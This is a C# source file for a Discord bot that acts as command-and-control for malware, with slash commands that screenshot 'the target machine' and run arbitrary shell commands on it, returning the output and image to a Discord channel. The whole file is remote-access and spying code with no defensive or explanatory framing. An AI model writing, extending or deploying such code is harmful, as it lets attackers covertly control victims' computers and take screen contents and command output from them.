using Discord.Interactions;

public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionContext>
{
    public InteractionService Commands { get; set; }

    [SlashCommand("screenshot", "take a screenshot of the target machine")]
    public async Task Screenshot()
    {
        await DeferAsync();
        await FollowupWithFileAsync(Utils.GetScreenshot(), "screenshot.png");
    }

    [SlashCommand("execute_command", "execute a command on the target machine")]
    public async Task Execute(string command)
    {
        await DeferAsync();
        string output = Utils.ExecuteCommandline(command);

        if (output == null)
        {
            await FollowupAsync("error");
            return;
        }

        if (output.Length > 2000-8) {
            IEnumerable<string> chunks = Utils.CommandOutputWrapper(output);
            foreach (string chunk in chunks)
            {
                await Context.Channel.SendMessageAsync(chunk);
            }
            await FollowupAsync("executed");
        } else {
            await FollowupAsync($"```\n{output}\n```");
        }
        
    }
}